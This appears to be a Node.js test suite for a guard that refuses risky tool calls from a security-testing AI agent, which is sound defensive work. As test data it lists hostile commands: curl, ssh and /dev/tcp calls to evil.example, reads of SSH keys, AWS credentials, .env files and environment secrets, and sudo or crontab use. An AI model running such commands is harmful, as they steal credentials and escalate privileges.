// R37: the guard of the Security Executor (spec 0.5.0, 5g, S5-19). Calls redteamGuard() in process.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { redteamGuard } from '../scripts/lib/redteam-guard.mjs';
import { tempProject } from './helpers.mjs';

const SX = 'guilda:security-executor';
const dir = fs.realpathSync(tempProject({ git: true }));
const home = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'guilda-home-')));
const state = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'guilda-state-')));
const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'guilda-outside-')));
fs.mkdirSync(path.join(dir, 'tests', 'fixtures'), { recursive: true });
const ENV = { ...process.env, HOME: home, XDG_STATE_HOME: state };
const KEYS = path.join('guilda', 'keys');

const call = (tool_name, tool_input, agent_type = SX) => ({ tool_name, tool_input, agent_type, cwd: dir });
const bash = (command, agent_type) => call('Bash', { command }, agent_type);
const guard = (input) => redteamGuard(dir, input, ENV);

// The ten planted steps of lab L5-5, in the order of the lab.
const PLANTED = [
  ['network to a public host', bash('curl --max-time 2 http://guilda-lab.invalid/')],
  ['write to a shell profile outside', call('Write', { file_path: path.join(outside, '.bashrc'), content: 'lab' })],
  ['read of a fake ssh key', call('Read', { file_path: path.join(dir, 'fake-home', '.ssh', 'id_ed25519') })],
  ['cat of ~/.ssh', bash('cat ~/.ssh/guilda-lab-absent-key')],
  ['cat of .aws', bash(`cat ${dir}/fake-home/.aws/credentials ~/.aws/guilda-lab-absent`)],
  ['cat of .claude', bash(`cat ~/.claude/guilda-lab-absent.json ${dir}/fake-home/.claude/.credentials.json`)],
  ['printenv of a token', bash('printenv GUILDA_LAB_FAKE_TOKEN')],
  ['npm install', bash('npm install --registry http://127.0.0.1:9/ left-pad')],
  ['sudo', bash('sudo -n true')],
  ['pkexec', bash('pkexec --version')],
];

for (const [name, input] of PLANTED) {
  test(`S5-19 planted: ${name} is refused with R37`, () => {
    const r = guard(input);
    assert.ok(r, 'refused');
    assert.match(r.reason, /^R37: /);
  });
  test(`S5-19 planted: ${name} gives no refusal for guilda:executor`, () => {
    assert.equal(guard({ ...input, agent_type: 'guilda:executor' }), null);
  });
}

const REFUSED = [
  ['curl to a public name', 'curl https://example.com/x'],
  ['curl with a user part that hides the host', 'curl http://localhost@evil.example/x'],
  ['ssh to a host', 'ssh user@evil.example'],
  ['nc with no readable target', 'nc -l'],
  ['wget through a shell string', 'bash -c "wget http://evil.example/a"'],
  ['xargs curl', 'echo x | xargs curl http://evil.example'],
  ['git push', 'git push origin main'],
  ['git -C fetch', 'git -C . fetch --all'],
  ['gh', 'gh api /user'],
  ['bash dev tcp', 'cat < /dev/tcp/evil.example/80'],
  ['inline node with a public URL', 'node -e "fetch(\'https://evil.example\')"'],
  ['pip install', 'pip install requests'],
  ['python -m pip', 'python3 -m pip install x'],
  ['yarn bare', 'yarn'],
  ['npx', 'npx cowsay hi'],
  ['dnf install', 'dnf install nmap'],
  ['doas', 'doas id'],
  ['sudo inside a pipe', 'echo x | sudo tee /etc/x'],
  ['env dump', 'env'],
  ['env dump in a pipe', 'env | grep KEY'],
  ['bare set', 'set'],
  ['export -p', 'export -p'],
  ['declare -p', 'declare -p'],
  ['proc environ', 'cat /proc/self/environ'],
  ['secret variable', 'echo $GITHUB_TOKEN'],
  ['inline process.env', 'node -e "console.log(process.env)"'],
  ['.env file', 'cat .env'],
  ['.env.local file', 'cat ./app/.env.local'],
  ['key folder', `cat ${state}/${KEYS}/abc.key`],
  ['gcloud config', 'cat ~/.config/gcloud/credentials.db'],
  ['cd to .ssh', 'cd ~/.ssh && ls'],
  ['$HOME form', 'cat $HOME/.aws/credentials'],
  ['codex folder', 'cat ~/.codex/auth.json'],
  ['redirect outside', `echo x > ${outside}/a.txt`],
  ['append outside', `echo x >> ${outside}/a.txt`],
  ['tee outside', `echo x | tee ${outside}/a.txt`],
  ['cp outside', `cp a.txt ${outside}/a.txt`],
  ['mv with ..', 'mv a.txt ../a.txt'],
  ['sed -i outside', `sed -i s/a/b/ ${outside}/a.txt`],
  ['redirect to a variable', 'echo x > $OUT'],
  ['crontab', 'crontab -l'],
  ['systemctl', 'systemctl --user enable x'],
  ['profile write', 'echo x >> ~/.bashrc'],
  ['trufflehog without --no-verification', 'trufflehog filesystem .'],
  ['osv-scanner fix', 'osv-scanner fix --lockfile package-lock.json'],
];
for (const [name, command] of REFUSED) {
  test(`refused: ${name}`, () => {
    const r = guard(bash(command));
    assert.ok(r, `refused: ${command}`);
    assert.match(r.reason, /^R37: /);
  });
}

test('refused: Read of a .env, Glob of **/.env, Grep in ~/.ssh, Read of the key folder', () => {
  for (const i of [
    call('Read', { file_path: path.join(dir, '.env') }),
    call('Glob', { pattern: '**/.env' }),
    call('Grep', { pattern: 'x', path: path.join(home, '.ssh') }),
    call('Read', { file_path: '~/.aws/credentials' }),
    call('Read', { file_path: path.join(state, KEYS, 'k.key') }),
  ]) assert.match(guard(i)?.reason ?? '', /^R37: /);
});

test('refused: Write or Edit outside the project, and through a link out', () => {
  const link = path.join(dir, 'link-out');
  fs.symlinkSync(outside, link);
  for (const i of [
    call('Write', { file_path: path.join(outside, 'a.txt'), content: 'x' }),
    call('Edit', { file_path: '/etc/hosts', old_string: 'a', new_string: 'b' }),
    call('Write', { file_path: path.join(link, 'a.txt'), content: 'x' }),
    call('Write', { file_path: path.join(dir, '..', 'a.txt'), content: 'x' }),
  ]) assert.match(guard(i)?.reason ?? '', /^R37: /);
});

test('refused: web and MCP tools, and a Bash call with no text (X9)', () => {
  for (const i of [call('WebFetch', { url: 'http://localhost' }), call('WebSearch', { query: 'x' }), call('mcp__x__y', {}), call('Bash', {})]) {
    assert.match(guard(i)?.reason ?? '', /^R37: /);
  }
});

test('allowed local actions pass', () => {
  const allowed = [
    bash('ls'),
    bash('node --test tests/security-executor.test.mjs'),
    bash('curl localhost:3000'),
    bash('curl http://localhost:3000/health'),
    bash('curl -s -o out.json http://127.0.0.1:8080/api'),
    bash('curl http://[::1]:3000/'),
    bash('git status && git diff'),
    bash('git add a.js && git commit -m x'),
    bash('grep -rn "eval(" src/'),
    bash('set -e'),
    bash('env NODE_ENV=test node --test'),
    bash('echo x > out.txt'),
    bash('echo x > /dev/null 2>&1'),
    bash('mkdir -p tests/sec && cp a.txt tests/sec/a.txt'),
    bash('cat tests/fixtures/.env'),
    bash('trufflehog filesystem . --no-verification'),
    bash('osv-scanner --offline .'),
    bash('semgrep --config rules/ src/'),
    call('Read', { file_path: path.join(dir, 'src', 'a.js') }),
    call('Read', { file_path: path.join(dir, 'tests', 'fixtures', '.env') }),
    call('Grep', { pattern: 'password', path: dir }),
    call('Glob', { pattern: 'src/**/*.js' }),
    call('Write', { file_path: path.join(dir, 'tests', 'sec.test.js'), content: 'x' }),
    call('Edit', { file_path: path.join(dir, 'a.js'), old_string: 'a', new_string: 'b' }),
  ];
  for (const i of allowed) assert.equal(guard(i), null, JSON.stringify(i.tool_input));
});

test('other agent types and the main session are untouched', () => {
  for (const type of ['guilda:executor', 'guilda:reviewer', 'guilda:security', undefined, '', 'guilda:security-executor-x']) {
    assert.equal(guard({ ...bash('sudo id'), agent_type: type }), null, String(type));
    assert.equal(guard({ ...call('WebFetch', {}), agent_type: type }), null, String(type));
  }
  assert.equal(redteamGuard(dir, null, ENV), null);
  assert.equal(redteamGuard(dir, 'x', ENV), null);
});

test('a reason holds no command text', () => {
  const r = guard(bash('curl https://very-secret-host.example/path?token=abc'));
  assert.ok(r);
  assert.doesNotMatch(r.reason, /very-secret-host|token=abc|curl/);
});

test('an error inside the guard refuses (X9)', () => {
  const r = redteamGuard('/nonexistent/guilda/project', { ...call('Bash', { command: 'ls' }), cwd: '/nonexistent/guilda/cwd' }, ENV);
  assert.match(r?.reason ?? '', /^R37: /);
});
